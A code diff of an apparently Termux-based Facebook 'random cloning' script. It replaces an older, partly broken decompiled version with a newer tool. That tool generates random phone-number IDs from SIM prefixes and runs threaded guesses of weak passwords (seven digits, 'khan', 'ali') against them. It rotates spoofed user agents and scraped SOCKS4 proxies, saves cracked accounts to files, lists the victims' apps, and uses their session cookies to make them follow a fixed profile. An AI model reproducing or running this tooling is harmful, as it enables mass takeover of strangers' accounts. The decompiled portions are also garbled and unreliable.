@@ -1,162 +1,88 @@
-# Source Generated with Decompyle++
-# File: test.pyc (Python 3.9)
-
-import os
-import sys
-import time
-import requests
-import uuid
-os.system('git pull')
-os.system('pkg install curl')
-
-class jalan:
-    
-    def __init__(self, z):
-        pass
-
-
-logo = '   \n\x1b[1;32m       888    d8P  8888888b.   .d8888b.  \n\x1b[1;35m       888   d8P   888   Y88b d88P  Y88b \n\x1b[1;35m       888  d8P    888    888 Y88b.      \n\x1b[1;32m       888d88K     888   d88P  "Y888b.   \n\x1b[1;32m       8888888b    8888888P"      "Y88b. \n\x1b[1;35m       888  Y88b   888 T88b         "888 \n\x1b[1;35m       888   Y88b  888  T88b  Y88b  d88P \n\x1b[1;32m       888    Y88b 888   T88b  "Y8888P"  \n\n\x1b[1;37m================= \x1b[32;45mKASHIF\x1b[0;m =====================\n\x1b[1;32m     \x1b[1;33mCREATED BY\x1b[0;m   :  \x1b[1;33mARYAN\x1b[0;m\x1b[1;32m && \x1b[1;33mKASHIF\x1b[0;m\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m ArYan KhAn\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mTEAM-KRS\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mKRS\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m2.3\n\x1b[1;37m================= \x1b[32;45mARYAN\x1b[0;m =====================\n\n       \x1b[37;41m\t WELLCOME TO KRS TOOL\x1b[0;m\n\n\x1b[1;37m================== \x1b[32;45mNIDA\x1b[0;m ======================\n'
-
-def ud():
-    os.system('clear')
-    jalan(logo)
-    print(' [1] SUBSCRIBE MY CHANNEL')
-    print(' [2] EXIT')
-    opt = input('\n   Choose option >>> ')
-    if opt == '1':
-        os.system('xdg-open https://youtube.com/channel/UCG8CSxk8KQMZuVfRhCa6FBw')
-        FD()
-        return None
-    None('\n\x1b[1;31mEXIT\x1b[0;97m')
-
-
-def FD():
-    os.system('clear')
-    print(logo)
-    print('\x1b[1;33m [1] SUBSCRIBE MY FRIEND CHANNEL')
-    print(' [2] EXIT')
-    opt = input('\n  \x1b[1;32m Choose option >>> ')
-    if opt == '1':
-        os.system('xdg-open https://youtu.be/y837qD_AO6Q')
-        o()
-        return None
-    None('\n\x1b[1;31mEXIT\x1b[0;97m')
-
-
-def o():
-    os.system('clear')
-    jalan(logo)
-    jalan('\tðŸ”¥ðŸ”¥RANDOM NUMBER CRACKðŸ”¥ðŸ”¥')
-    print('')
-    jalan('\x1b[1;32m [1]\x1b[1;33m RANDOM CRACK ')
-    jalan('\x1b[1;32m [2] \x1b[1;32mCONTACT ME ON FACEBOOK')
-    jalan(' \x1b[1;32m[3] \x1b[1;32mSUBSCRIBE MY CHANNEL')
-    jalan(' \x1b[1;32m[4] \x1b[1;32mJOIN FB GROUP')
-    jalan(' \x1b[1;32m[00] \x1b[1;31mEXIT')
-    opt = input('\n   \x1b[1;32m Choose option >>> ')
-    if opt == '1':
-        i()
-    if None == '2':
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100082840689031')
-        return None
-    if None == '3':
-        os.system('xdg-open https://youtube.com/channel/UCG8CSxk8KQMZuVfRhCa6FBw')
-        return None
-    if None == '4':
-        os.system('xdg-open https://facebook.com/groups/207678473842318/')
-        return None
-    if None == '0':
-        os.system('exit')
-        return None
-    None('\n\x1b[1;31m  Choose valid option\x1b[0;97m')
-
-
-import os,sys,time,json,random,re,string,platform,base64,uuid
-os.system("git pull")
+#created by adi
+#tottaly written by Mr Adi
+#!/usr/bin/python3
+#---------------------[IMPORT]---------------------#
 from bs4 import BeautifulSoup as sop
-from bs4 import BeautifulSoup
-import requests as ress
+from concurrent.futures import ThreadPoolExecutor as tred
+import os,sys,time,json,random,re,string,platform,base64,platform,uuid
+import requests,random,sys,json,os,re
+from time import sleep
+from os import system
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
+import marshal
+import zlib
+import base64
 from datetime import date
 from datetime import datetime
 from time import sleep
 from time import sleep as waktu
+from random import random as acak
+from random import choice as pilih
+from random import randint
+from bs4 import BeautifulSoup
+import requests as ress
+from sys import exit as exit
+
+###----------[ IMPORT LIBRARY ]---------- ###
+import requests
+import bs4
+import sys
+import os
+import random
+import time
+import re
+import json
+import uuid
+import subprocess
+import marshal
+import rich
+import shutil
+import webbrowser
+from random import randint
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+from bs4 import BeautifulSoup as par
+from datetime import date
+from datetime import datetime
+# from rich import print as printer
+from datetime import date
+import marshal
 try:
     import requests
     from concurrent.futures import ThreadPoolExecutor as ThreadPool
     import mechanize
     from requests.exceptions import ConnectionError
 except ModuleNotFoundError:
-    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
-    os.system('pip install bs4')
-    
-def cek_apk(session,coki):
-    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
-    else:
-        print(f'\r[ðŸŽ®] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
-        for i in range(len(game)):
-            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
-        #else:
-            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
-    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
-    else:
-        print(f'\r[ðŸŽ®] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
-        for i in range(len(game)):
-            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
-        else:
-            print('')
- 
-def follow(self, session, coki):
-        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
-            'cookie': coki }, **('cookies',)).text, 'html.parser')
-        get = r.find('a', 'Ikuti', **('string',)).get('href')
-        session.get('https://free.facebook.com' + str(get), {
-            'cookie': coki }, **('cookies',)).text
-            
-            
- 
-class jalan:
-    def __init__(self, z):
-        for e in z + "\n":
-            sys.stdout.write(e)
-            sys.stdout.flush()
-            time.sleep(0.009)
-            
-RED = '\033[1;91m'
+    os.system('pip install mechanize requests futures==2 > /dev/null')
+    os.system('python Pro07.py')
+from bs4 import BeautifulSoup
+from datetime import date
+from datetime import datetime
+from time import sleep
+from time import sleep as waktu
+
+A = '\x1b[1;97m' 
+B = '\x1b[1;96m' 
+C = '\x1b[1;91m' 
+D = '\x1b[1;92m'
+M = '{RED}'
+H = '{GREEN}'
+N = '\x1b[1;37m'    
+E = '\x1b[1;93m' 
+F = '\x1b[1;94m'
+G = '\x1b[1;95m'
+GREEN ='\x1b[38;5;46m'
+RED = '\x1b[38;5;196m'
 WHITE = '\033[1;97m'
-GREEN = '\033[1;32m' #
 YELLOW = '\033[1;33m'
 BLUE = '\033[1;34m'
 ORANGE = '\033[1;35m'
-P = '\x1b[1;97m' # PUTIH
-M = '\x1b[1;91m' # MERAH
-H = '\x1b[1;92m' # HIJAU
-K = '\x1b[1;93m' # KUNING
-B = '\x1b[1;94m' # BIRU
-U = '\x1b[1;95m' # UNGU
-O = '\x1b[1;96m' # BIRU MUDA
-N = '\x1b[0m'    # WARNA MATI
-A = '\x1b[1;90m' # WARNA ABU ABU
-BN = '\x1b[1;107m' # BELAKANG PUTIH
-BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
-BP = '\x1b[1;105m' # BELAKANG PINK
-BB = '\x1b[1;104m' # BELAKANG BIRU
-BK = '\x1b[1;103m' # BELAKANG KUNING
-BH = '\x1b[1;102m' # BELAKANG HIJAU
-BM = '\x1b[1;101m' # BELAJANG MERAH
-BA = '\x1b[1;100m' # BELAKANG ABU ABU
-my_color = [
- P, M, H, K, B, U, O, N]
-warna = random.choice(my_color)
+BLACK="\033[1;30m"
+R = '{RED}' # PUTIH
+G = '{GREEN}' # PUTIH
+Y = '\033[1;33m' # PUTIH
+Q = '\033[1;37m'
+T = '\033[1;34m'
+HBF = '{ HBF }'
 now = datetime.now()
 dt_string = now.strftime("%H:%M")
 current = datetime.now()
@@ -164,30 +90,112 @@ ta = current.year
 bu = current.month
 ha = current.day
 today = date.today()
-logo =                                          ("""    
+import random
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+twf =[]
+user=[]
+ugen=[]
+for nt in range(10000):
+    rr=random.randint
+    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    rx=random.randrange(1, 999)
+    xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}.1.0; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
+    ugen.append(xx)
 
-\33[1;32m       8b    d8  dP"Yb  .dP"Y8 88  88 88 88b 88 
-\33[1;35m       88b  d88 dP   Yb `Ybo." 88  88 88 88Yb88 
-\33[1;35m       88YbdP88 Yb   dP o.`Y8b 888888 88 88 Y88 
-\33[1;32m       88 YY 88  YbodP  8bodP' 88  88 88 88  Y8" 
-
- 
-\033[1;37m================= \33[32;45mIRTAZA\33[0;m =====================
-\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mIRTAZA\33[0;m\033[1;32m && \033[1;33mMOSHIN\33[0;m
-\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m MUHAMMAD MOSHIN 
-\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mMOSHIN-007
-\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
-\033[1;32m     \033[1;35mTEAM         :  \033[1;35mIRTAZA MUHAMMAD MOSHIN
-\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.3
-\033[1;37m================= \33[32;45mIRTAZA\33[0;m =====================
- 
-       \33[37;41m\t WELLCOME TO M.I  TOOL\33[0;m
- 
-\033[1;37m================== \33[32;45mM.I\33[0;m ======================\n""")
 loop = 0
-oks = []
-cps = []
- 
+cp = []
+ok = []
+twf = []
+
+ugen = []
+for xd in range(5000):
+    aa='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
+    c=' en-us; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+    ugen.append(uaku2)
+try:
+    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+    open('.prox.txt','w').write(prox)
+except Exception as e:
+    print(' WELCOME TO RANDOM CLONING SYSTEM')
+    
+prox=open('.prox.txt','r').read().splitlines()
+
+
+for xd in range(10000):
+    a='Mozilla/5.0 (Symbian/3; Series60/'
+    b=random.randrange(1, 9)
+    c=random.randrange(1, 9)
+    d='Nokia'
+    e=random.randrange(100, 9999)
+    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
+    g=random.randrange(1, 9)
+    h=random.randrange(1, 4)
+    i=random.randrange(1, 4)
+    j=random.randrange(1, 4)
+    k='Mobile Safari/535.1'
+    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
+    ugen.append(uaku)
+
+
+    aa='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['6','7','8','9','10','11','12'])
+    c=' en-us; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+for x in range(10):
+    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
+    b=random.randrange(100, 9999)
+    c=random.randrange(100, 9999)
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    h=random.randrange(1, 9)
+    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
+    j=random.randrange(1, 9)
+    k=random.randrange(1, 9)
+    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
+    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
+def uaku():
+    try:
+        ua=open('bbnew.txt','r').read().splitlines()
+        for ub in ua:
+            ugen.append(ub)
+    except:
+        a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
+        ua=open('.bbnew.txt','w')
+        aa=re.findall('line">(.*?)<',str(a))
+        for un in aa:
+            ua.write(un+'\n') 
+        ua=open('.bbnew.txt','r').read().splitlines()
+
+loop = 0
+cp = []
+ok = []
+twf = []
+
 def clear():
     os.system('clear')
     print(logo)
@@ -200,103 +208,437 @@ if ltx > 12:
 else:
     a = ltx
     tag = "AM"
-    
-    
-try:
-    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
-    v = 5.2
-    update = ('5.2')
-    update = ('5.2')
-    if str(v) in update:
-        os.system('clear')
-    else:pass
-except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
-#global functions
-def dynamic(text):
-    titik = ['.   ','..  ','... ','.... ']
-    for o in titik:
-        print('\r'+text+o),
-        sys.stdout.flush();time.sleep(1)
- 
-#User agents
-ugen2=[]
-ugen=[]
- 
-for xd in range(10000):
-    aa='Mozilla/5.0 (Linux; U; Android'
-    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
-    c=' en-us; GT-'
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    e=random.randrange(1, 999)
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-    h=random.randrange(73,100)
-    i='0'
-    j=random.randrange(4200,4900)
-    k=random.randrange(40,150)
-    l='Mobile Safari/537.36'
-    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-    ugen.append(uaku2)
-    
-# APK CHECK
-def i():
-    user=[]
-    twf =[]
+
+logo ="""  \033[1;92m _______  _______    _______  ______  _________
+  \033[1;97m__   __  __   __  _______ 
+  \033[1;92m|  |_|  ||  |_|  ||       |  
+  \033[1;97m|       ||       ||  _____|   
+  \033[1;92m|       ||       || |_____ 
+  \033[1;97m|       ||       ||_____  |   
+  \033[1;92m| ||_|| || ||_|| | _____| |
+  \033[1;97m|_|   |_||_|   |_||_______|
+\033[1;97m====================================================
+\033[1;97m[+]\033[1;91m    AUTHOR   \033[1;90m: \033[1;92mMUHAMMAD MOSHIN
+\033[1;97m[+]\033[1;91m    FACEBOOK \033[1;90m: \033[1;92mMUHAMMAD MUSHIN
+\033[1;97m[+]\033[1;91m    WHATSAPP \033[1;90m: \033[1;92m+923254985137
+\033[1;97m====================================================
+\x1b[31;1m   \x1b[47;2m[ THIS TOOL IS FREE ]\x1b[00;1m\x1b[31;1m \x1b[31;1m \x1b[47;2m[ POWERED BY MR Adi ]\x1b[00;1m\x1b[31;1m
+\033[1;97m===================================================="""
+clear()
+os.system("xdg-open https://www.facebook.com/musa.khan.39545")
+xxxx = str(len(ugen))
+print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+print('\033[1;97m====================================================') 
+print("\033[1;97m[+]\033[1;92m TOTAL USER AGENTS \033[1;91m: \033[1;96m" + xxxx)
+print('\033[1;97m====================================================') 
+print (' \t           \033[1;37m[ \033[1;32mINTRODUCTION \033[1;37m]')
+print('\033[1;97m====================================================') 
+NameX =input('\033[1;97m[+]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \033[1;96m')
+#---------------------[LOOP MENU]---------------------#
+loop = 0
+cp = []
+ok = []
+twf = []
+#---------------------[APPLICATION CHECKER]---------------------#
+def cek_apk(session,coki):
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print('\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \033[1;93mSorry there is no Active  Apk')
+    else:
+        print('\r[🎮] \033[1;92m ☆ Your Active Apps ☆ \033[1;91m: \033[1;96m')
+        for i in range(len(game)):
+            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
+            #created by hbf team(owners) Adi & Hamii
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print('\r\033[1;92m[+]\033[1;91m Sorry there is no Expired Apk')
+    else:
+        print('\r[🎮] \033[1;96m ◇ Your Expired Apps ◇ \033[1;91m: \033[1;92m')
+        for i in range(len(game)):
+            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
+        else:
+            print('\033[1;97m====================================================') 
+def follow(ses,coki):
+    ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100001020800712', cookies={'cookie': coki}).text, 'html.parser')
+    get = r.find('a', string='Follow').get('href')
+    ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
+
+#---------------------[MAIN MENU]---------------------#
+def main():
+    clear()
     os.getuid
-    os.geteuid
+    os.system("clear");print(logo)
+    clear()
+    print (' \t           \033[1;37m[ \033[1;32mMAIN MENU \033[1;37m]')
+    print('\033[1;97m====================================================') 
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
+    print(f"\033[1;97m[+] \033[1;92mUSERNAME \033[1;91m: \033[1;96m{NameX}")
+    print('\033[1;97m====================================================') 
+    print(f"\033[1;97m[01] \033[1;92mRANDOM CLONE ")
+    print(f"\033[1;97m[02] \033[1;92mFOLLOW ME ON FACEBOOK")
+    print(f"\033[1;97m[00] \033[1;92mEXIT ")
+    print('\033[1;97m====================================================') 
+    adi = input("\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SELECT OPTION \033[1;37m: \033[1;36m")
+    if adi in ["1","01"]:
+        passx()
+    elif adi in ["2","02"]:
+        os.system("xdg-open https://www.facebook.com/musa.khan.39545")
+        main()
+    elif adi in ["0","00"]:
+       exit()
+    else:
+        print('\033[1;31mINCORECT OPTION!\3[1;31m')
+        main()
+
+def passx():
     os.system("clear")
-    jalan(logo)
-    
-    
-    jalan("\033[1;37m\t  USE OUR COUNTRY CODE  ")
-    jalan('\033[1;36m     \t     PAK CODES\n     \033[1;33m92301, \033[1;33m92302 ,\033[1;33m92303 ,\033[1;33m92305  ...\033[0;97m')
-    jalan('\033[1;32m============================================')
-    jalan('\033[1;36m     \t     INDIA CODES\n     \033[1;33m91778, \033[1;33m91930 ,\033[1;33m91902 ,\033[1;33m91712  ...\033[0;97m')
-    jalan('\033[1;32m============================================')
-    jalan('\033[1;36m     \t     BD CODES\n     \033[1;33m88016, \033[1;33m88017 ,\033[1;33m88018 ,\033[1;33m88019  ...\033[0;97m')
-    jalan('\033[1;32m============================================\n')
-    code = input(' PUT CODE : ')
-    print("")
-    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
+    print(logo)
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
+    print('              \x1b[97m\033[37;41m[ PASSWORD MENU ]\033[0;m ')
+    print('\033[1;97m====================================================') 
+    print("\033[1;97m[01] \033[1;92mAUTO PASS 7 DIGITS         \033[1;96m[FASTEST]")
+    print("\033[1;97m[02] \033[1;92mAUTO PASS 7 AND 11 DIGITS  \033[1;96m[FAST]")
+    print("\033[1;97m[03] \033[1;92mAUTO PASS 7 DIGIT AND KHAN \033[1;96m[FAST]")
+    print("\033[1;97m[04] \033[1;92mONLY KHAN PASS             \033[1;96m[SLOWEST]")
+    print("\033[1;97m[05] \033[1;92mKHAN & ALI MIX PASS        \033[1;96m[SLOWEST]")
+    print("\033[1;97m[06] \033[1;92mKHAN & MALIK MIX PASS      \033[1;96m[SLOWEST]")
+    print("\033[1;97m====================================================")
+    adi = input("\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SELECT PASSWORD METHOD \033[1;37m: \033[1;36m")
+    if adi in ["1","01"]:
+        pass1()
+    elif adi in ["2","02"]:
+        pass2()
+    elif adi in ["3","03"]:
+        pass3()
+    elif adi in ["4","04"]:
+       pass4()
+    elif adi in ["5","05"]:
+       pass5()
+    elif adi in ["6","06"]:
+       pass6()
+    else:
+        print('\033[1;31mINCORECT OPTION!\3[1;31m')
+        passx()
+
+def pass1():
+    os.system("clear")
+    print(logo)
+    clear()
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
+    print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m")
+    print('\033[1;97m====================================================') 
+    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m")
+    print('\033[1;97m====================================================') 
+    print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
+    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
+    print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ')
+    print('\033[1;97m====================================================') 
+    print(f"\x1b[97m\033[37;41m BEST CODE FOR PAK [0300 / 0302 / 0306 / 0349 /0315]\033[0;m")
+    print('\033[1;97m====================================================') 
+    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
+    os.system("clear")
+    print(logo)
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
+    print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m")
+    print('\033[1;97m====================================================') 
+    limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;97m====================================================\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
-    os.system("clear")
-    print(logo)
-    passx = int(input("[*] Enter Password Limit : "))
-    HamiiID = []
-    print("")
-    for bilal in range(passx):
-        pww = input("[*] Enter Password : ")
-        HamiiID.append(pww)
-    with ThreadPool(max_workers=50) as manshera:
+    with ThreadPool(max_workers=30) as manshera:    
         clear()
         tl = str(len(user))
-        print('\033[1;36m TOTAL IDS: '+tl)
-        print('\033[1;36m THE PROCESS HAS BEEN STARTED')
-        print('\033[1;31m USE AEROPLANE MOOD IN EVERY 4 MIN ')
-        print('\033[1;32m============================================')
+        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+        print('\033[1;97m====================================================') 
+        print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX)
+        print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
+        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
+        print('\033[1;97m[+]\033[1;92m PASSWORD METHOD\033[1;91m          : \033[1;96m1') 
+        print('\033[1;97m====================================================') 
+        print(' \033[1;32mPLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+        print('\033[1;97m====================================================') 
         for love in user:
-            pwx = [love[1:]]
             uid = code+love
-            for Eman in HamiiID:
-                pwx.append(Eman)
-            manshera.submit(rcrack,uid,pwx,tl)
-    print('\033[1;32m============================================')
-    print('Crack process has been completed')
-    print('Ids saved in ok.txt,cp.txt')
-    print('\033[1;32m============================================')
- 
-def rcrack(uid,pwx,tl):
-    #print(user)
+            pwx = [love,]
+            manshera.submit(freeq,uid,pwx,tl)
+    print('')
+    print('\033[1;97m====================================================') 
+    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
+    print('\033[1;97m====================================================') 
+    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
+    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
+
+def pass2():
+    os.system("clear")
+    print(logo)
+    clear()
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
